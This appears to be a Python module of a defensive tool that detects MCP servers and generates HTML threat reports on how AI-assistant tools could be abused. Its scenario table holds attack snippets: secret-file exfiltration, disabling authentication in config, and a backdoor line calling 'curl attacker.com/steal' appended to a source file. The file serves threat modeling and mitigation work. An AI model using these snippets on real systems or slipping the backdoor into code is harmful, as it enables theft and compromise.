"""
Threat analyzer for generating attack scenarios and abuse cases for detected MCP tools.

This module analyzes detected MCP servers and generates detailed threat analysis
including attack vectors, abuse scenarios, and mitigation strategies.
"""

from typing import Dict, Any, List, Tuple
from datetime import datetime
from .base import ReportData


class ThreatAnalyzer:
    """Analyzes MCP detection data to generate threat analysis and attack scenarios."""
    
    # Attack scenarios for different MCP tools
    ATTACK_SCENARIOS = {
        "exa-mcp-server": {
            "threat_level": "HIGH",
            "attack_vectors": [
                {
                    "name": "Information Reconnaissance",
                    "severity": "HIGH",
                    "description": "Attacker uses web search capabilities to gather intelligence about targets",
                    "steps": [
                        "Gain access to AI assistant with Exa MCP server",
                        "Use web_search tool to research target organization",
                        "Search for employee information, technologies, vulnerabilities",
                        "Gather intelligence for social engineering attacks",
                        "Map attack surface using public information"
                    ],
                    "example_code": """# Malicious reconnaissance example
search_results = await exa_search("site:target-company.com employees")
tech_stack = await exa_search("target-company.com technology stack vulnerabilities")
social_media = await exa_search("target-company.com employees linkedin")""",
                    "impact": "Complete organizational intelligence gathering"
                },
                {
                    "name": "Phishing Content Generation",
                    "severity": "CRITICAL",
                    "description": "Generate convincing phishing content using real-time web data",
                    "steps": [
                        "Search for current events related to target organization",
                        "Retrieve company news and announcements",
                        "Generate contextually relevant phishing emails",
                        "Create fake login pages based on real company sites",
                        "Launch targeted spear-phishing campaigns"
                    ],
                    "example_code": """# Phishing content generation
company_news = await exa_search("target-company.com recent news announcements")
login_page = await get_contents("https://target-company.com/login")
# Use this data to create convincing phishing content""",
                    "impact": "Highly effective targeted phishing attacks"
                }
            ]
        },
        "context7-mcp": {
            "threat_level": "MEDIUM",
            "attack_vectors": [
                {
                    "name": "Dependency Confusion Attack Research",
                    "severity": "MEDIUM",
                    "description": "Research legitimate packages to create malicious alternatives",
                    "steps": [
                        "Use Context7 to research popular libraries",
                        "Identify package naming patterns and versions",
                        "Create typosquatting or dependency confusion packages",
                        "Upload malicious packages with similar names",
                        "Wait for developers to accidentally install malicious packages"
                    ],
                    "example_code": """# Research legitimate packages for confusion attacks
popular_libs = await resolve_library_id("react")
docs = await get_library_docs("/facebook/react")
# Analyze naming patterns to create malicious alternatives""",
                    "impact": "Supply chain attacks through package confusion"
                },
                {
                    "name": "Vulnerability Research Automation",
                    "severity": "HIGH",
                    "description": "Automate discovery of vulnerabilities in popular libraries",
                    "steps": [
                        "Query documentation for multiple libraries",
                        "Identify deprecated or insecure functions",
                        "Cross-reference with known vulnerability databases",
                        "Generate exploit code based on documentation",
                        "Target applications using vulnerable libraries"
                    ],
                    "example_code": """# Automated vulnerability research
for lib in popular_libraries:
    docs = await get_library_docs(lib)
    # Parse docs for security-sensitive functions
    # Cross-reference with CVE databases""",
                    "impact": "Automated vulnerability discovery and exploitation"
                }
            ]
        },
        "mcp-server-filesystem": {
            "threat_level": "CRITICAL",
            "attack_vectors": [
                {
                    "name": "Source Code Exfiltration",
                    "severity": "CRITICAL",
                    "description": "Steal sensitive source code and intellectual property",
                    "steps": [
                        "Gain access to AI assistant with filesystem access",
                        "Use directory_tree to map entire codebase structure",
                        "Read sensitive files like .env, config files, source code",
                        "Search for API keys, passwords, and secrets",
                        "Exfiltrate valuable intellectual property"
                    ],
                    "example_code": """# Source code exfiltration
tree = await directory_tree("/project")
secrets = await search_files("/project", "*.env")
for secret_file in secrets:
    content = await read_file(secret_file)
    # Exfiltrate sensitive data""",
                    "impact": "Complete intellectual property theft"
                },
                {
                    "name": "Malicious Code Injection",
                    "severity": "CRITICAL",
                    "description": "Inject backdoors and malicious code into the project",
                    "steps": [
                        "Identify key source files and entry points",
                        "Create subtle backdoors in existing code",
                        "Modify build scripts to include malicious dependencies",
                        "Plant time bombs or logic bombs in the codebase",
                        "Ensure persistence across code reviews"
                    ],
                    "example_code": """# Malicious code injection
main_file = await read_file("/project/src/main.py")
backdoor_code = "import os; os.system('curl attacker.com/steal')"
modified = main_file + "\\n" + backdoor_code
await write_file("/project/src/main.py", modified)""",
                    "impact": "Persistent backdoor access and code compromise"
                },
                {
                    "name": "Configuration Tampering",
                    "severity": "HIGH",
                    "description": "Modify configuration files to create security vulnerabilities",
                    "steps": [
                        "Locate configuration files and security settings",
                        "Disable security features and logging",
                        "Modify database connections to attacker-controlled servers",
                        "Change API endpoints to malicious services",
                        "Create hidden administrative accounts"
                    ],
                    "example_code": """# Configuration tampering
config = await read_file("/project/config/security.yaml")
# Modify to disable authentication
modified_config = config.replace("auth_required: true", "auth_required: false")
await write_file("/project/config/security.yaml", modified_config)""",
                    "impact": "Complete security bypass and system compromise"
                }
            ]
        },
        "mcp-support-docs": {
            "threat_level": "LOW",
            "attack_vectors": [
                {
                    "name": "Code Structure Intelligence",
                    "severity": "LOW",
                    "description": "Gather intelligence about code architecture for targeted attacks",
                    "steps": [
                        "Generate class diagrams to understand system architecture",
                        "Identify critical classes and inheritance relationships",
                        "Map function dependencies and call graphs",
                        "Locate potential attack surfaces in the codebase",
                        "Plan targeted attacks based on code structure"
                    ],
                    "example_code": """# Code intelligence gathering
class_diagram = await create_class_diagram("/target/project")
functions = await create_module_functions("/target/project")
# Analyze for attack opportunities""",
                    "impact": "Enhanced attack planning through code analysis"
                }
            ]
        }
    }
    
    # Attack chains that combine multiple tools
    ATTACK_CHAINS = [
        {
            "name": "Advanced Persistent Threat (APT) Chain",
            "severity": "CRITICAL",
            "tools_required": ["exa-mcp-server", "mcp-server-filesystem"],
            "steps": [
                "Reconnaissance using Exa web search",
                "Source code analysis using filesystem access",
                "Backdoor injection into critical files",
                "Persistence through configuration changes",
                "Data exfiltration using web search for C2 servers"
            ],
            "description": "Complete compromise using multiple MCP tools in sequence"
        },
        {
            "name": "Supply Chain Attack Chain",
            "severity": "HIGH",
            "tools_required": ["context7-mcp", "mcp-server-filesystem"],
            "steps": [
                "Research popular libraries using Context7",
                "Analyze project dependencies using filesystem access",
                "Inject malicious dependencies into package files",
                "Modify build scripts to include backdoors",
                "Wait for deployment to production systems"
            ],
            "description": "Sophisticated supply chain compromise"
        }
    ]
    
    def analyze_threats(self, data: ReportData) -> Dict[str, Any]:
        """
        Analyze detection results and generate comprehensive threat analysis.
        
        Args:
            data: Report data containing detection results
            
        Returns:
            Dict containing threat analysis data for template rendering
        """
        detection_results = data.detection_results
        
        # Identify detected MCP servers
        detected_servers = self._identify_detected_servers(detection_results)
        
        # Generate attack vector analysis
        attack_vectors = self._generate_attack_vectors(detected_servers)
        
        # Generate abuse scenarios
        abuse_scenarios = self._generate_abuse_scenarios(detected_servers)
        
        # Generate attack chains
        attack_chains = self._generate_attack_chains(detected_servers)
        
        # Generate mitigation strategies
        mitigation_strategies = self._generate_mitigation_strategies(detected_servers)
        
        # Generate detection indicators
        detection_indicators = self._generate_detection_indicators(detected_servers)
        
        # Calculate threat levels
        threat_levels = self._calculate_threat_levels(detected_servers)
        
        # Generate compliance impact
        compliance_impact = self._generate_compliance_impact(detected_servers, threat_levels)
        
        return {
            # Basic metadata
            "scan_target": "localhost",
            "scan_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "overall_threat_level": threat_levels["overall"],
            
            # Threat summary
            "critical_threats": threat_levels["critical"],
            "high_threats": threat_levels["high"],
            "medium_threats": threat_levels["medium"],
            "low_threats": threat_levels["low"],
            
            # Key findings
            "key_attack_scenarios": self._format_key_scenarios(detected_servers),
            
            # Detailed analysis
            "attack_vector_analysis": self._format_attack_vectors(attack_vectors),
            "abuse_scenarios_analysis": self._format_abuse_scenarios(abuse_scenarios),
            "attack_chains_analysis": self._format_attack_chains(attack_chains),
            
            # Mitigation and detection
            "mitigation_strategies": self._format_mitigation_strategies(mitigation_strategies),
            "detection_indicators": self._format_detection_indicators(detection_indicators),
            "security_recommendations": self._format_security_recommendations(detected_servers),
            "compliance_impact": self._format_compliance_impact(compliance_impact),
            
            # Template metadata
            "template_name": "threat_analysis",
            "render_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
        }
    
    def _identify_detected_servers(self, detection_results: List[Any]) -> List[str]:
        """Identify which MCP servers were detected."""
        detected_servers = []
        
        for result in detection_results:
            method_str = result.detection_method.value if hasattr(result.detection_method, 'value') else str(result.detection_method)
            if (method_str == "process_enumeration" and 
                hasattr(result, 'raw_data') and 
                result.raw_data and 
                'process_data' in result.raw_data):
                
                process_data = result.raw_data['process_data']
                if process_data.get('has_mcp_indicators', False):
                    cmdline = process_data.get('cmdline', [])
                    if len(cmdline) >= 2:
                        server_path = cmdline[1]
                        
                        # Identify server type
                        if "exa-mcp-server" in server_path:
                            detected_servers.append("exa-mcp-server")
                        elif "context7-mcp" in server_path:
                            detected_servers.append("context7-mcp")
                        elif "mcp-server-filesystem" in server_path:
                            detected_servers.append("mcp-server-filesystem")
                        elif "mcp-support-docs" in server_path:
                            detected_servers.append("mcp-support-docs")
        
        return list(set(detected_servers))  # Remove duplicates
    
    def _generate_attack_vectors(self, detected_servers: List[str]) -> List[Dict[str, Any]]:
        """Generate attack vectors for detected servers."""
        attack_vectors = []
        
        for server in detected_servers:
            if server in self.ATTACK_SCENARIOS:
                scenario = self.ATTACK_SCENARIOS[server]
                for vector in scenario["attack_vectors"]:
                    attack_vectors.append({
                        "server": server,
                        "threat_level": scenario["threat_level"],
                        **vector
                    })
        
        return attack_vectors
    
    def _generate_abuse_scenarios(self, detected_servers: List[str]) -> List[Dict[str, Any]]:
        """Generate specific abuse scenarios."""
        scenarios = []
        
        for server in detected_servers:
            if server in self.ATTACK_SCENARIOS:
                server_scenarios = self.ATTACK_SCENARIOS[server]
                scenarios.append({
                    "server": server,
                    "threat_level": server_scenarios["threat_level"],
                    "scenarios": server_scenarios["attack_vectors"]
                })
        
        return scenarios
    
    def _generate_attack_chains(self, detected_servers: List[str]) -> List[Dict[str, Any]]:
        """Generate attack chains that use multiple detected servers."""
        applicable_chains = []
        
        for chain in self.ATTACK_CHAINS:
            required_tools = chain["tools_required"]
            if all(tool in detected_servers for tool in required_tools):
                applicable_chains.append(chain)
        
        return applicable_chains
    
    def _calculate_threat_levels(self, detected_servers: List[str]) -> Dict[str, Any]:
        """Calculate threat level distribution."""
        levels = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        
        for server in detected_servers:
            if server in self.ATTACK_SCENARIOS:
                threat_level = self.ATTACK_SCENARIOS[server]["threat_level"]
                if threat_level == "CRITICAL":
                    levels["critical"] += len(self.ATTACK_SCENARIOS[server]["attack_vectors"])
                elif threat_level == "HIGH":
                    levels["high"] += len(self.ATTACK_SCENARIOS[server]["attack_vectors"])
                elif threat_level == "MEDIUM":
                    levels["medium"] += len(self.ATTACK_SCENARIOS[server]["attack_vectors"])
                else:
                    levels["low"] += len(self.ATTACK_SCENARIOS[server]["attack_vectors"])
        
        # Determine overall threat level
        if levels["critical"] > 0:
            overall = "CRITICAL"
        elif levels["high"] > 0:
            overall = "HIGH"
        elif levels["medium"] > 0:
            overall = "MEDIUM"
        else:
            overall = "LOW"
        
        return {**levels, "overall": overall}
    
    def _generate_mitigation_strategies(self, detected_servers: List[str]) -> List[Dict[str, Any]]:
        """Generate mitigation strategies for detected threats."""
        strategies = []
        
        if "exa-mcp-server" in detected_servers:
            strategies.extend([
                {
                    "title": "Web Access Controls",
                    "description": "Implement strict controls on web search capabilities",
                    "actions": [
                        "Configure allowlist of permitted domains",
                        "Implement request logging and monitoring",
                        "Set rate limits on search requests",
                        "Review and approve all web search queries"
                    ]
                },
                {
                    "title": "Content Filtering",
                    "description": "Filter and sanitize web search results",
                    "actions": [
                        "Implement content filtering for sensitive information",
                        "Block access to social media and personal information",
                        "Sanitize search results before processing",
                        "Log all retrieved content for audit"
                    ]
                }
            ])
        
        if "mcp-server-filesystem" in detected_servers:
            strategies.extend([
                {
                    "title": "Filesystem Access Controls",
                    "description": "Implement strict filesystem access controls",
                    "actions": [
                        "Use read-only access where possible",
                        "Implement file access logging",
                        "Restrict access to sensitive directories",
                        "Use sandboxing and containerization"
                    ]
                },
                {
                    "title": "Code Integrity Monitoring",
                    "description": "Monitor for unauthorized code changes",
                    "actions": [
                        "Implement file integrity monitoring",
                        "Use version control for all changes",
                        "Require code review for all modifications",
                        "Set up alerts for unexpected file changes"
                    ]
                }
            ])
        
        if "context7-mcp" in detected_servers:
            strategies.append({
                "title": "Documentation Access Controls",
                "description": "Control access to external documentation",
                "actions": [
                    "Limit documentation queries to approved libraries",
                    "Monitor for suspicious research patterns",
                    "Implement query logging and analysis",
                    "Use cached documentation where possible"
                ]
            })
        
        return strategies
    
    def _generate_detection_indicators(self, detected_servers: List[str]) -> List[Dict[str, Any]]:
        """Generate indicators for detecting attacks."""
        indicators = []
        
        if "exa-mcp-server" in detected_servers:
            indicators.extend([
                {
                    "title": "Suspicious Web Search Patterns",
                    "indicators": [
                        "High volume of searches for employee information",
                        "Searches for vulnerability databases or exploit code",
                        "Queries targeting specific organizations or individuals",
                        "Unusual search patterns outside normal business hours"
                    ]
                },
                {
                    "title": "Reconnaissance Activity",
                    "indicators": [
                        "Searches for company infrastructure information",
                        "Queries for social media profiles of employees",
                        "Searches for technology stack information",
                        "Attempts to gather competitive intelligence"
                    ]
                }
            ])
        
        if "mcp-server-filesystem" in detected_servers:
            indicators.extend([
                {
                    "title": "Unauthorized File Access",
                    "indicators": [
                        "Access to sensitive files outside normal patterns",
                        "Bulk reading of source code files",
                        "Access to configuration and environment files",
                        "Unusual file modification patterns"
                    ]
                },
                {
                    "title": "Code Injection Attempts",
                    "indicators": [
                        "Modifications to critical system files",
                        "Injection of suspicious code patterns",
                        "Changes to build or deployment scripts",
                        "Creation of hidden or obfuscated files"
                    ]
                }
            ])
        
        return indicators
    
    def _generate_compliance_impact(self, detected_servers: List[str], threat_levels: Dict[str, Any]) -> Dict[str, Any]:
        """Generate compliance and regulatory impact analysis."""
        impact = {
            "frameworks_affected": [],
            "risk_level": threat_levels["overall"],
            "recommendations": []
        }
        
        if "mcp-server-filesystem" in detected_servers:
            impact["frameworks_affected"].extend([
                "SOX (Sarbanes-Oxley) - Source code integrity",
                "PCI DSS - Secure development practices",
                "ISO 27001 - Information security management"
            ])
        
        if "exa-mcp-server" in detected_servers:
            impact["frameworks_affected"].extend([
                "GDPR - Data protection and privacy",
                "CCPA - Consumer privacy rights",
                "HIPAA - Healthcare information protection"
            ])
        
        impact["recommendations"] = [
            "Conduct regular security assessments of MCP tools",
            "Implement data loss prevention (DLP) controls",
            "Establish incident response procedures for AI tool abuse",
            "Document security controls for compliance audits"
        ]
        
        return impact
    
    def _format_key_scenarios(self, detected_servers: List[str]) -> str:
        """Format key attack scenarios summary."""
        scenarios = []
        
        for server in detected_servers:
            if server in self.ATTACK_SCENARIOS:
                server_info = self.ATTACK_SCENARIOS[server]
                for vector in server_info["attack_vectors"]:
                    scenarios.append(f"<li><strong>{vector['name']}</strong> - {vector['description']}</li>")
        
        return f"<ul>{''.join(scenarios)}</ul>" if scenarios else "<p>No critical attack scenarios identified.</p>"
    
    def _format_attack_vectors(self, attack_vectors: List[Dict[str, Any]]) -> str:
        """Format detailed attack vector analysis."""
        if not attack_vectors:
            return "<p>No attack vectors identified for detected MCP servers.</p>"
        
        html = ""
        for vector in attack_vectors:
            html += f"""
            <div class="attack-vector">
                <h3>{vector['name']} <span class="threat-level {vector['severity'].lower()}">{vector['severity']}</span></h3>
                <p><strong>Target:</strong> {vector['server']}</p>
                <p><strong>Description:</strong> {vector['description']}</p>
                
                <div class="attack-steps">
                    <h4>Attack Steps</h4>
                    <ol>
            """
            
            for step in vector['steps']:
                html += f"<li>{step}</li>"
            
            html += f"""
                    </ol>
                </div>
                
                <div class="code-example" data-danger="true">
{vector['example_code']}
                </div>
                
                <div class="alert danger">
                    <strong>Potential Impact:</strong> {vector['impact']}
                </div>
            </div>
            """
        
        return html
    
    def _format_abuse_scenarios(self, abuse_scenarios: List[Dict[str, Any]]) -> str:
        """Format tool abuse scenarios."""
        if not abuse_scenarios:
            return "<p>No specific abuse scenarios identified.</p>"
        
        html = ""
        for scenario in abuse_scenarios:
            html += f"""
            <h3>{scenario['server'].replace('-', ' ').title()} Abuse Scenarios</h3>
            <p><strong>Overall Threat Level:</strong> <span class="threat-level {scenario['threat_level'].lower()}">{scenario['threat_level']}</span></p>
            """
            
            for abuse in scenario['scenarios']:
                html += f"""
                <div class="alert warning">
                    <h4>{abuse['name']}</h4>
                    <p>{abuse['description']}</p>
                    <p><strong>Severity:</strong> {abuse['severity']}</p>
                </div>
                """
        
        return html
    
    def _format_attack_chains(self, attack_chains: List[Dict[str, Any]]) -> str:
        """Format attack chain analysis."""
        if not attack_chains:
            return "<p>No multi-tool attack chains possible with current MCP server configuration.</p>"
        
        html = ""
        for chain in attack_chains:
            html += f"""
            <div class="attack-chain">
                <h4>{chain['name']} <span class="threat-level {chain['severity'].lower()}">{chain['severity']}</span></h4>
                <p>{chain['description']}</p>
                
                <div class="chain-steps">
            """
            
            for i, step in enumerate(chain['steps']):
                if i > 0:
                    html += '<span class="chain-arrow">→</span>'
                html += f'<div class="chain-step">{step}</div>'
            
            html += """
                </div>
                
                <p><strong>Required Tools:</strong> {}</p>
            </div>
            """.format(", ".join(chain['tools_required']))
        
        return html
    
    def _format_mitigation_strategies(self, strategies: List[Dict[str, Any]]) -> str:
        """Format mitigation strategies."""
        html = ""
        for strategy in strategies:
            html += f"""
            <div class="mitigation-item">
                <h4>{strategy['title']}</h4>
                <p>{strategy['description']}</p>
                <ul>
            """
            
            for action in strategy['actions']:
                html += f"<li>{action}</li>"
            
            html += "</ul></div>"
        
        return html
    
    def _format_detection_indicators(self, indicators: List[Dict[str, Any]]) -> str:
        """Format detection indicators."""
        html = ""
        for indicator in indicators:
            html += f"""
            <div class="detection-item">
                <h4>{indicator['title']}</h4>
                <ul>
            """
            
            for item in indicator['indicators']:
                html += f"<li>{item}</li>"
            
            html += "</ul></div>"
        
        return html
    
    def _format_security_recommendations(self, detected_servers: List[str]) -> str:
        """Format security hardening recommendations."""
        recommendations = [
            "Implement principle of least privilege for all MCP tools",
            "Enable comprehensive logging and monitoring",
            "Regular security assessments and penetration testing",
            "Establish incident response procedures for AI tool abuse",
            "Implement network segmentation for MCP services",
            "Use sandboxing and containerization where possible",
            "Regular updates and security patches for all MCP tools",
            "Employee training on AI tool security risks"
        ]
        
        html = "<ol>"
        for rec in recommendations:
            html += f"<li>{rec}</li>"
        html += "</ol>"
        
        return html
    
    def _format_compliance_impact(self, compliance_impact: Dict[str, Any]) -> str:
        """Format compliance impact analysis."""
        html = f"""
        <div class="alert info">
            <h4>Risk Level: {compliance_impact['risk_level']}</h4>
            <p>The detected MCP tools may impact compliance with the following frameworks:</p>
        </div>
        
        <h4>Affected Compliance Frameworks</h4>
        <ul>
        """
        
        for framework in compliance_impact['frameworks_affected']:
            html += f"<li>{framework}</li>"
        
        html += """
        </ul>
        
        <h4>Compliance Recommendations</h4>
        <ul>
        """
        
        for rec in compliance_impact['recommendations']:
            html += f"<li>{rec}</li>"
        
        html += "</ul>"
        
        return html